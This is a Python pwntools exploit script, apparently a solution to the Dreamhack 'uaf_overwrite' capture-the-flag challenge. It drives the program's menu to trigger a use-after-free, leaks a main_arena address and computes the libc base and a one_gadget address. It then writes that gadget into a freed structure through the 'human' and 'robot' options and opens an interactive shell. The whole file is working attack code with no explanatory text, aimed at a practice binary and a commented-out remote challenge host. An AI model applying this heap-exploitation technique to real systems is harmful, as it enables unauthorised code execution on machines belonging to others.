from pwn import *

# p = remote("host1.dreamhack.games", 20652)
p = process("./uaf_overwrite")
e = ELF("./uaf_overwrite")
gdb.attach(p)

context.log_level = 'debug'

def slog(n, m): return success(": ".join([n, hex(m)]))

def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))

def robot(size):
    p.sendlineafter(">", "2")
    p.sendlineafter(": ", str(size))

def human(size, age):
    p.sendlineafter(">", "1")
    p.sendlineafter(": ", str(size))
    p.sendlineafter(": ", str(age))


# UAF to calculate the `libc_base`
custom(0x500, "AAAA", -1)
# custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)
custom(0x500, "BBBBBBBB", -1)

main_arena_xx = u64(p.recvline()[8:-1]+b"\x00"*2)
lb = main_arena_xx - 0x1ebbe0
# og = lb + 0xe6c7e
og = lb + 0xe6c81
# og = lb + 0xe6c84

slog("main_arena_xx", main_arena_xx)
slog("libc_base", lb)
slog("og", og)

human("1", og)
robot("1")

p.interactive()